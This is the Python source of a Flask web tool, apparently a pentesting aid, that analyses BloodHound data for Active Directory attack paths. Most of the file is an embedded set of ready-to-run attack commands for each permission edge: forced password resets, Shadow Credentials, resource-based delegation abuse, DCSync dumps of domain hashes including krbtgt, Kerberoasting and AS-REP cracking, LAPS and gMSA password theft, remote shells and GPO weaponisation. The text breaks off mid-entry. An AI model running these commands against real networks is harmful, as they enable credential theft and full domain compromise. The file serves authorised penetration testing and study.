#!/usr/bin/env python3
"""
Bober Edition — BloodHound Attack Path Analyzer
Start: python3 app.py
Available at: http://localhost:5000
"""

import json
import zipfile
import os
import logging
from io import BytesIO
from collections import defaultdict
from flask import Flask, request, jsonify, render_template_string

# Suppress werkzeug development server warning
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB max ZIP

# ─── CONSTANTS ───────────────────────────────────────────────────────────────
CRITICAL_RIGHTS = {
    'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner', 'Owns',
    'ForceChangePassword', 'DCSync', 'AddKeyCredentialLink',
    'WriteSPN', 'ReadGMSAPassword', 'AllExtendedRights',
    'WriteAccountRestrictions', 'AddAllowedToAct', 'AllowedToAct',
    'AddSelf', 'AddMember',
    'GetChanges', 'GetChangesAll', 'GetChangesInFilteredSet', 'ReadLAPSPassword',
    'SyncLAPSPassword', 'WriteGPLink', 'Contains', 'GpLink',
    'AdminTo', 'CanRDP', 'CanPSRemote', 'ExecuteDCOM', 'SQLAdmin',
}

NOISE = {
    'DOMAIN ADMINS', 'ENTERPRISE ADMINS', 'ADMINISTRATORS',
    'ACCOUNT OPERATORS', 'BACKUP OPERATORS', 'PRINT OPERATORS',
    'SERVER OPERATORS', 'SCHEMA ADMINS', 'NT AUTHORITY',
    'CREATOR OWNER', 'SYSTEM', 'EVERYONE', 'AUTHENTICATED USERS',
    'KEY ADMINS', 'ENTERPRISE KEY ADMINS',
}

SEVERITY = {
    'GenericAll': 1, 'DCSync': 2, 'GetChangesAll': 2, 'GetChanges': 2,
    'WriteDacl': 3, 'WriteOwner': 4, 'Owns': 5, 'ForceChangePassword': 6,
    'GenericWrite': 7, 'AllExtendedRights': 8, 'WriteSPN': 9,
    'ReadGMSAPassword': 10, 'AddKeyCredentialLink': 11,
    'WriteAccountRestrictions': 12, 'AddAllowedToAct': 12, 'AllowedToAct': 12,
    'GetChangesInFilteredSet': 12, 'AddSelf': 13, 'AddMember': 14,
    'WriteGPLink': 13, 'ReadLAPSPassword': 15, 'SyncLAPSPassword': 15,
    'AdminTo': 16, 'CanRDP': 17, 'CanPSRemote': 17, 'ExecuteDCOM': 17, 'SQLAdmin': 17,
    'Contains': 90, 'GpLink': 90,
}

RIGHT_ALIASES = {
    'LAPSRead': 'ReadLAPSPassword',
}

KNOWN_SIDS = {
    'S-1-5-32-544': 'ADMINISTRATORS', 'S-1-5-32-548': 'ACCOUNT OPERATORS',
    'S-1-5-32-549': 'SERVER OPERATORS', 'S-1-5-32-550': 'PRINT OPERATORS',
    'S-1-5-32-551': 'BACKUP OPERATORS', 'S-1-1-0': 'EVERYONE',
    'S-1-5-11': 'AUTHENTICATED USERS', 'S-1-5-18': 'SYSTEM',
}

ATTACK_TIPS = {
'ForceChangePassword': """=== CORE IDEA ===
# Reset TARGET user's password without knowing the current password.
# This changes the account state and can break services if TARGET is a service account.
# If TARGET is a computer account (especially a DC/RODC), password reset may break the secure channel / machine trust.
# In that context this is usually a destructive side path, not the primary abuse route.

=== RESET PASSWORD ===
# bloodyAD with explicit credentials:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'

# bloodyAD with Kerberos ccache:
KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST set password TARGET 'NewPass123!'

# Samba net rpc alternative:
net rpc password TARGET 'NewPass123!' -U DOMAIN/USER%PASS -S DC_IP

=== AFTERWARD ===
# Use the new password only where TARGET actually has access:
nxc smb TARGET_HOST -u TARGET -p 'NewPass123!'
# Password resets commonly generate Windows event 4724 on the DC.
SOURCE: https://bloodhound.specterops.io/resources/edges/force-change-password""",

'GenericAll': """=== TARGET = USER ===
# Password reset:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
# Shadow Credentials (if PKINIT is usable; often cleaner than changing the password):
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP

=== TARGET = GROUP ===
# Add the owned/current user to the controlled group:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET USER

=== TARGET = COMPUTER ===
# RBCD path. Requires a controlled computer/service account; create one if MachineAccountQuota allows it:
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
# Allow FAKE01$ to impersonate users to TARGET$:
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
# Request a CIFS ticket as a privileged user to the target computer:
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP

=== TARGET = DOMAIN OBJECT ===
# GenericAll on the domain root includes the replication rights needed for DCSync:
impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
SOURCE: https://bloodhound.specterops.io/resources/edges/generic-all""",

'GenericWrite': """=== TARGET = USER ===
# Shadow Credentials: write msDS-KeyCredentialLink and authenticate as TARGET.
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP

# Targeted Kerberoast: add an SPN to TARGET, request a TGS, then crack it.
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/TARGET'
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

=== TARGET = GROUP ===
# Add the owned/current user to the controlled group:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET USER

=== TARGET = COMPUTER ===
# Shadow Credentials can also target computer accounts; keep the trailing $ if needed.
certipy shadow auto -u USER@DOMAIN -p PASS -account 'TARGET$' -dc-ip DC_IP

# RBCD path. Requires a controlled computer/service account; create one if MachineAccountQuota allows it:
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP

=== TARGET = GPO / OU / DOMAIN ===
# GenericWrite may enable GPO modification or gPLink abuse; use the dedicated GPO/gPLink workflow for that object.
SOURCE: https://bloodhound.specterops.io/resources/edges/generic-write""",

'WriteDacl': """=== CORE IDEA ===
# WriteDacl lets you edit the target object's DACL.
# Practical shortcut: grant your controlled principal GenericAll/FullControl, then follow the GenericAll path for that target type.

=== TARGET = USER / COMPUTER / GROUP / GPO ===
# Grant FullControl to the controlled/current user:
impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS
# Equivalent bloodyAD shortcut:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add genericAll TARGET USER

# Next step depends on target type:
# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
# GROUP    -> add USER to TARGET
# COMPUTER -> Shadow Credentials or RBCD
# GPO      -> modify the GPO / use a GPO abuse workflow

=== TARGET = DOMAIN OBJECT ===
# Prefer granting only DCSync rights when the target is the domain root:
impacket-dacledit -action write -rights DCSync -principal USER -target DOMAIN -dc-ip DC_IP DOMAIN/USER:PASS
# Equivalent bloodyAD shortcut:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add dcsync USER
# Then dump:
impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP

=== TARGET = OU / CONTAINER ===
# FullControl can be inherited by child objects if inheritance is enabled and the ACE is written with inheritance flags:
impacket-dacledit -action write -rights FullControl -principal USER -target-dn 'OU=TARGET,DC=DOMAIN,DC=LOCAL' -inheritance -dc-ip DC_IP DOMAIN/USER:PASS
SOURCE: https://bloodhound.specterops.io/resources/edges/write-dacl""",

'WriteOwner': """=== CORE IDEA ===
# WriteOwner lets you take ownership of TARGET.
# Once you own TARGET, you can edit its DACL, grant yourself control, then follow the GenericAll path.

# 1. Change TARGET owner to the controlled/current user:
impacket-owneredit -action write -new-owner USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS

# 2. As owner, grant FullControl to the controlled/current user:
impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS

# 3. Continue based on target type:
# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
# GROUP    -> add USER to TARGET
# COMPUTER -> Shadow Credentials or RBCD
# DOMAIN   -> grant DCSync rights / dump with secretsdump

=== DOMAIN OBJECT SHORTCUT ===
# After taking ownership of the domain root, grant DCSync rights instead of broad FullControl:
impacket-dacledit -action write -rights DCSync -principal USER -target DOMAIN -dc-ip DC_IP DOMAIN/USER:PASS
impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
SOURCE: https://bloodhound.specterops.io/resources/edges/write-owner""",

'Owns': """=== CORE IDEA ===
# You already own TARGET. Object owners can usually edit the security descriptor.
# Grant yourself control, then follow the GenericAll path for that target type.

# Grant FullControl to the controlled/current user:
impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS

# Equivalent bloodyAD shortcut if you prefer:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add genericAll TARGET USER

# Continue based on target type:
# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
# GROUP    -> add USER to TARGET
# COMPUTER -> Shadow Credentials or RBCD
# DOMAIN   -> grant DCSync rights / dump with secretsdump

=== NOTE ===
# Some environments can limit implicit owner rights (OWNER RIGHTS / BlockOwnerImplicitRights).
# If DACL modification fails, verify whether BloodHound reports OwnsLimitedRights/WriteOwnerLimitedRights instead.
SOURCE: https://bloodhound.specterops.io/resources/edges/owns""",

'AddSelf': """=== CORE IDEA ===
# AddSelf lets the controlled/current principal add itself to TARGET_GROUP.
# After the add, refresh the logon token / get a new Kerberos ticket before expecting inherited rights.

=== ADD CURRENT USER TO GROUP ===
# bloodyAD:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET_GROUP USER

# Kerberos ccache:
KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember TARGET_GROUP USER

# Samba net rpc alternative:
net rpc group addmem TARGET_GROUP USER -U DOMAIN/USER%PASS -S DC_IP

=== VERIFY / REFRESH ===
# Verify membership, then re-authenticate or request a fresh TGT:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object TARGET_GROUP --attr member
impacket-getTGT DOMAIN/USER:PASS -dc-ip DC_IP
# Group membership changes commonly generate Windows event 4728 for global security groups.
SOURCE: https://bloodhound.specterops.io/resources/edges/add-self""",

'AddMember': """=== CORE IDEA ===
# AddMember lets the controlled principal add arbitrary principals to TARGET_GROUP.
# Most abuse paths add the owned/current user, but another controlled user/computer can be added too.

=== ADD A PRINCIPAL TO GROUP ===
# Add USER to TARGET_GROUP:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET_GROUP USER

# Kerberos ccache:
KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember TARGET_GROUP USER

# Samba net rpc alternative:
net rpc group addmem TARGET_GROUP USER -U DOMAIN/USER%PASS -S DC_IP

=== VERIFY / REFRESH ===
# Verify membership, then refresh USER's token / get a fresh TGT:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object TARGET_GROUP --attr member
impacket-getTGT DOMAIN/USER:PASS -dc-ip DC_IP
# Group membership changes commonly generate Windows event 4728 for global security groups.
SOURCE: https://bloodhound.specterops.io/resources/edges/add-member""",

'WriteSPN': """=== TARGET = USER ===
# WriteSPN lets you write servicePrincipalName on the target user.
# Primary abuse: targeted Kerberoast.

# 1. Add a unique fake SPN to TARGET:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/TARGET'

# 2. Request only TARGET's TGS hash, then crack it offline:
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request-user TARGET -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# If the TGS is AES, use mode 19600 (etype 17) or 19700 (etype 18).

# 3. Cleanup. If TARGET had no original SPNs, delete the attribute you added:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName
# If TARGET had existing SPNs, restore the original servicePrincipalName list instead.

=== OPTIONAL: SPN-JACKING CONTEXT ===
# SPN-jacking is a separate chain. It also requires a KCD/delegation scenario and,
# for live SPN-jacking, rights to remove the SPN from its current owner.
# Do not treat WriteSPN alone as enough for KCD abuse or DCSync.
SOURCE: https://bloodhound.specterops.io/resources/edges/write-spn""",

'ReadGMSAPassword': """=== CORE IDEA ===
# The controlled principal can retrieve the managed password for TARGET gMSA.
# The useful output is usually the gMSA NT hash; use it like a normal account hash where the gMSA has access.

=== READ / CONVERT THE GMSA PASSWORD ===
# NetExec:
nxc ldap DC_IP -u USER -p PASS --gmsa
nxc ldap DC_IP -u USER -H NTLM_HASH --gmsa

# gMSADumper:
python3 gMSADumper.py -u USER -p PASS -d DOMAIN -l DC_IP

# bloodyAD can read the raw managed password blob, but you still need to decode it:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword

=== USE THE GMSA HASH ===
# Kerberos TGT / pass-the-cache:
impacket-getTGT DOMAIN/'GMSA_ACCOUNT$' -hashes :NT_HASH -dc-ip DC_IP
export KRB5CCNAME='GMSA_ACCOUNT$.ccache'

# Use only against hosts/services where the gMSA has rights:
nxc smb TARGET_IP -u 'GMSA_ACCOUNT$' -H NT_HASH
impacket-psexec -k -no-pass DOMAIN/'GMSA_ACCOUNT$'@TARGET_HOST
SOURCE: https://bloodhound.specterops.io/resources/edges/read-gmsa-password""",

'AddKeyCredentialLink': """=== CORE IDEA ===
# AddKeyCredentialLink lets you write msDS-KeyCredentialLink on TARGET.
# Primary abuse: Shadow Credentials -> authenticate as TARGET via Kerberos PKINIT.

=== CERTIPY AUTO FLOW ===
# Works for user or computer targets; keep the trailing $ for computer accounts.
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP

=== MANUAL PYWHISKER / PKINIT FLOW ===
# 1. Add a new KeyCredential and save the generated certificate:
pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action add --filename shadow_out

# 2. Request a TGT as TARGET using PKINIT:
python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow_out.pfx -pfx-pass <PFX_PASS> DOMAIN/TARGET TARGET.ccache
export KRB5CCNAME=TARGET.ccache

# 3. Optional: recover TARGET's NT hash from the AS-REP key printed by gettgtpkinit:
python3 PKINITtools/getnthash.py -key <AS_REP_KEY> DOMAIN/TARGET

# 4. Cleanup the added KeyCredential after use:
pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action remove --device-id <DEVICE_ID>

=== NOTE ===
# If the KDC cannot do PKINIT, the write may succeed but authentication will fail.
SOURCE: https://bloodhound.specterops.io/resources/edges/add-key-credential-link""",

'AllExtendedRights': """=== CORE IDEA ===
# AllExtendedRights grants all control-access extended rights on the target object.
# It is not the same as GenericAll; abuse depends heavily on the target type.

=== TARGET = USER ===
# Force password reset without knowing the old password:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'

=== TARGET = COMPUTER ===
# Read LAPS password for the target computer:
impacket-GetLAPSPassword -computer TARGET$ -dc-ip DC_IP DOMAIN/USER:PASS
# Then use the local Administrator password where applicable:
evil-winrm -i TARGET -u Administrator -p 'LAPS_PASSWORD'

=== TARGET = DOMAIN OBJECT ===
# AllExtendedRights on the domain root includes the replication rights needed for DCSync:
impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP

=== TARGET = CERTIFICATE TEMPLATE ===
# May grant enrollment rights on the template, if CA/template issuance requirements are also satisfied:
certipy req -u USER@DOMAIN -p PASS -ca CA-NAME -target DC_HOST -template TARGET
SOURCE: https://bloodhound.specterops.io/resources/edges/all-extended-rights""",

'WriteAccountRestrictions': """=== CORE IDEA ===
# WriteAccountRestrictions can modify account restriction attributes on TARGET.
# In BloodHound this edge is traversable, but the useful abuse depends heavily on TARGET type.

=== TARGET = USER ===
# Common abuse: enable AS-REP roasting by adding the DONT_REQ_PREAUTH flag to TARGET.
# Then request an AS-REP for offline cracking.
bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add uac TARGET -f DONT_REQ_PREAUTH
impacket-GetNPUsers DOMAIN/TARGET -dc-ip DC_IP -no-pass -request
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt

# Cleanup if needed:
bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP remove uac TARGET -f DONT_REQ_PREAUTH

=== TARGET = COMPUTER ===
# High-value abuse: write msDS-AllowedToActOnBehalfOfOtherIdentity -> RBCD.
# The delegating account must have an SPN; computer accounts naturally do.

# 1. Create a controlled computer if you do not already own an SPN-bearing account:
bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add computer FAKE01 'FakePass123!'

# 2. Allow FAKE01$ to act on behalf of other users to TARGET$:
bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add rbcd TARGET FAKE01$

# 3. Request a service ticket as a delegable user to TARGET:
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
export KRB5CCNAME=<generated_ticket>.ccache

# 4. Use the ticket against TARGET:
impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP

=== CHECKS / LIMITS ===
# For user targets, the exact writable account-control flags matter; AS-REP roast is the usual practical branch.
# For computer targets, RBCD is the branch BloodHound most commonly implies here.
# Protected Users or accounts marked sensitive for delegation cannot be impersonated through RBCD.
# If MachineAccountQuota is 0, use an already-controlled SPN-bearing account instead of creating FAKE01$.
SOURCE: https://bloodhound.specterops.io/resources/edges/write-account-restrictions""",

'AddAllowedToAct': """=== CORE IDEA ===
# AddAllowedToAct means you can modify msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET computer.
# Practical abuse: add a controlled SPN-bearing account to TARGET's RBCD security descriptor, then use S4U.
# This is the "write the RBCD setting" step.

=== RBCD WRITE + ABUSE ===
# 1. Create a controlled computer if you do not already own an SPN-bearing account:
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS

# 2. Add FAKE01$ to TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity:
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS

# 3. Request a ticket as a delegable user to TARGET:
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
export KRB5CCNAME=<generated_ticket>.ccache

# 4. Use the ticket:
impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN

=== CHECKS / LIMITS ===
# The delegating account must have an SPN. Computer accounts naturally do.
# Protected Users / sensitive-for-delegation users cannot normally be impersonated.
SOURCE: https://bloodhound.specterops.io/resources/edges/add-allowed-to-act""",

'AllowedToAct': """=== CORE IDEA ===
# AllowedToAct means TARGET already allows the source principal to perform RBCD to it.
# This is the "RBCD already configured" state; you usually do not need to write the attribute again.
# The source principal must have an SPN and be controlled by you.

=== REQUEST AND USE TICKET ===
# Request a service ticket as a delegable user to TARGET:
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'SOURCE$':'SOURCE_PASSWORD'
export KRB5CCNAME=<generated_ticket>.ccache

# Use the ticket against TARGET:
impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP

=== CHECKS / LIMITS ===
# Protected Users / sensitive-for-delegation users cannot normally be impersonated.
# If SOURCE is not controlled, AllowedToAct is context, not usable access.
SOURCE: https://bloodhound.specterops.io/resources/edges/allowed-to-act""",

'DCSync': """=== CORE IDEA ===
# DCSync means the principal has the replication rights needed to ask a DC for password material.
# BloodHound creates this edge from GetChanges + GetChangesAll on the domain object.

=== DUMP DOMAIN HASHES ===
# NTLM hashes only:
impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
# Kerberos auth / pass-the-cache:
impacket-secretsdump -just-dc-ntlm -k -no-pass DOMAIN/USER@DC_HOST -dc-ip DC_IP
# NetExec alternative:
nxc smb DC_IP -u USER -p PASS --ntds

=== TARGETED DUMP ===
# krbtgt hash for Golden Ticket workflows:
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
# Single user:
impacket-secretsdump -just-dc-user TARGETUSER DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
SOURCE: https://bloodhound.specterops.io/resources/edges/dc-sync""",

'GetChangesAll': """=== PARTIAL DCSYNC RIGHT ===
# GetChangesAll alone is not enough for DCSync.
# DCSync requires GetChanges + GetChangesAll on the domain object.
# BloodHound may also create a separate DCSync edge when the complete combination exists.

=== WHAT TO CHECK ===
# Look for a matching GetChanges edge for the same principal -> same domain object.
# If only GetChangesAll is present, treat it as a sensitive dependency, not a ready dump path.
SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes-all""",

'GetChanges': """=== PARTIAL DCSYNC RIGHT ===
# GetChanges alone is not enough for DCSync.
# DCSync requires GetChanges + GetChangesAll on the domain object.
# GetChanges + GetChangesInFilteredSet can instead indicate SyncLAPSPassword.

=== WHAT TO CHECK ===
# Look for a matching GetChangesAll edge for the same principal -> same domain object.
# If the complete pair exists, use the DCSync workflow.
SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes""",

'GetChangesInFilteredSet': """=== PARTIAL DIRSYNC RIGHT ===
# GetChangesInFilteredSet allows synchronization of the Filtered Attribute Set.
# It is not abuseable by itself.
# BloodHound may create SyncLAPSPassword when GetChanges + GetChangesInFilteredSet are both present on the domain object.

=== WHAT TO CHECK ===
# Look for a matching GetChanges edge for the same principal -> same domain object.
# If the complete pair exists, use the SyncLAPSPassword workflow.
# If only GetChangesInFilteredSet is present, treat it as a sensitive dependency, not a ready LAPS read path.
SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes-in-filtered-set""",

'SyncLAPSPassword': """=== CORE IDEA ===
# SyncLAPSPassword means the principal can use DirSync-style replication to retrieve confidential/RODC-filtered attributes.
# Practically, this can expose LAPS passwords such as classic ms-Mcs-AdmPwd.
# BloodHound derives this from GetChanges + GetChangesInFilteredSet on the domain object.

=== DIRSYNC LAPS READ ===
# Windows / DirSync-style workflow:
Sync-LAPS -LDAPFilter '(samaccountname=TARGET$)'

# Scope to a known target computer where possible:
Sync-LAPS -LDAPFilter '(samaccountname=TARGET$)' -Domain DOMAIN

=== USE THE PASSWORD ===
# Once the LAPS password is recovered, use it like a local admin password on that host:
evil-winrm -i TARGET_HOST -u Administrator -p 'LAPS_PASSWORD'
nxc smb TARGET_HOST -u Administrator -p 'LAPS_PASSWORD'

=== NOTE ===
# This is not the same as direct ReadLAPSPassword on one computer object.
# It is a domain-level replication-style path and may generate 4662 events if audited.
SOURCE: https://bloodhound.specterops.io/resources/edges/sync-laps-password""",

'ReadLAPSPassword': """=== CORE IDEA ===
# ReadLAPSPassword means the controlled principal can read the local admin password stored on the target computer object.
# Classic LAPS attribute: ms-MCS-AdmPwd. Windows LAPS may use msLAPS-* attributes.

=== READ THE PASSWORD FROM LDAP ===
# Impacket:
impacket-GetLAPSPassword -computer TARGET$ -dc-ip DC_IP DOMAIN/USER:PASS
# Add -ldaps if the DC requires LDAPS.

# bloodyAD classic LAPS:
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'TARGET$' --attr ms-MCS-AdmPwd

=== USE NETEXEC DIRECTLY WITH LAPS ===
# NetExec can read the LAPS password and use it over SMB/WinRM:
nxc smb TARGET_IP -u USER -p PASS --laps
nxc winrm TARGET_IP -u USER -p PASS --laps
# If the local admin account is renamed:
nxc winrm TARGET_IP -u USER -p PASS --laps Administrator

=== USE THE PASSWORD MANUALLY ===
evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
SOURCE: https://www.netexec.wiki/smb-protocol/defeating-laps""",

'MemberOf': """=== CORE IDEA ===
# MemberOf is not an exploit by itself.
# It means the source principal belongs to the destination security group.
# The source inherits the group's effective rights and any attack paths that start from that group.

=== WHAT TO CHECK ===
# Look at the destination group's outbound/inbound rights:
# - ACL rights the group has over users, computers, groups, GPOs, OUs, or the domain
# - nested group membership that leads to a higher-value group
# - local admin / remote management style rights if present in the dataset

=== NEXT STEP ===
# Follow the next meaningful edge after the group.
# If the group has GenericAll/AddMember/WriteDacl/etc., use that specific edge's tip instead.
SOURCE: https://bloodhound.specterops.io/resources/edges/member-of""",

'Contains': """=== CORE IDEA ===
# Contains is a scope/inheritance edge, not an exploit by itself.
# It means an OU/container/domain contains the destination object.
# Linked GPOs and inheritable ACEs on the parent can affect contained child objects.

=== WHAT TO CHECK ===
# Look at the parent container's inbound edges:
# - GPLink from GPOs that apply to the contained users/computers
# - WriteDacl / GenericAll / Owns-style rights on the parent that may inherit to children
# - whether inheritance is blocked or the GPO link is enforced

=== NEXT STEP ===
# Follow the actual control edge: GPLink, WriteGPLink, WriteDacl, GenericAll, etc.
# Do not treat Contains alone as control of the child object.
SOURCE: https://bloodhound.specterops.io/resources/edges/contains""",

'GpLink': """=== CORE IDEA ===
# GPLink means a GPO is linked to a domain or OU.
# The GPO's settings apply to users/computers in that scope; enforced links can bypass blocked inheritance.
# GPLink alone does not mean you can modify the GPO.

=== WHAT TO CHECK ===
# Check whether the controlled principal has rights over the linked GPO:
# - GenericAll / GenericWrite / WriteDacl / WriteOwner on the GPO
# - WriteGPLink on the domain/OU if the path is about linking a GPO
# - security filtering / WMI filtering that narrows the affected targets

=== NEXT STEP ===
# If you control the GPO, use a GPO abuse workflow such as SharpGPOAbuse/pyGPOAbuse.
# If you only see GPLink, treat it as "this GPO affects this scope", not as an abuse primitive.
SOURCE: https://bloodhound.specterops.io/resources/edges/gp-link""",

'WriteGPLink': """=== CORE IDEA ===
# WriteGPLink means the controlled principal can modify the gPLink attribute on a domain or OU.
# This can link a GPO to that scope, causing the GPO to apply to contained users/computers, including nested OUs.
# This is different from GPLink: GPLink is an existing link; WriteGPLink is permission to change links.

=== ABUSE PATH ===
# 1. Prefer using an already-controlled GPO, or first gain control of a GPO.
# 2. Link that GPO to the target OU/domain.
# 3. Weaponize the GPO with a focused change, such as an immediate scheduled task.
# 4. Use security filtering / WMI filtering where possible to reduce blast radius.

=== TOOLS ===
# Windows:
SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author DOMAIN\\Admin --Command 'cmd.exe' --Arguments '/c whoami > C:\\Windows\\Temp\\gpo.txt' --GPOName 'CONTROLLED_GPO'

# Linux:
./pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" -powershell -command "whoami > C:\\Windows\\Temp\\gpo.txt" -taskname "Update"

=== CHECKS / LIMITS ===
# Without control of a GPO, WriteGPLink alone is not enough for the simple path.
# Fake/remote GPO approaches exist but require extra setup, DNS/machine-account conditions, and are much easier to get wrong.
# Expect normal Group Policy refresh timing unless you can trigger gpupdate or coerce a refresh.
SOURCE: https://bloodhound.specterops.io/resources/edges/write-gp-link""",

'AllowedToDelegate': """=== CORE IDEA ===
# Controlled account has Kerberos Constrained Delegation to specific SPNs in msDS-AllowedToDelegateTo.
# You can request a service ticket as another user only to those delegated services.
# Protected Users / "Account is sensitive and cannot be delegated" can block impersonation.

=== WITH PROTOCOL TRANSITION (T2A4D / TrustedToAuthForDelegation) ===
# S4U2Self + S4U2Proxy: impersonate a delegable user to the delegated SPN.
impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/USER:PASS
export KRB5CCNAME=<generated_ticket>.ccache

# Use the ticket against the target service:
impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
# If the delegated target is a DC service, DCSync may be possible:
impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/Administrator@DC_HOST -dc-ip DC_IP

=== ALTSERVICE / ANYSPN NOTE ===
# The ticket service class can often be changed for the same host (for example HTTP -> CIFS/LDAP):
impacket-getST -spn 'http/TARGET.DOMAIN' -altservice 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/USER:PASS
# This does not make arbitrary hosts valid; the host must match the delegation context.

=== WITHOUT PROTOCOL TRANSITION ===
# Kerberos-only constrained delegation needs a forwardable service ticket from the victim to the KCD service.
# A simple getST -impersonate flow will usually fail with KDC_ERR_BADOPTION.
# If you already captured a forwardable ticket to the KCD service, use S4U2Proxy with that ticket:
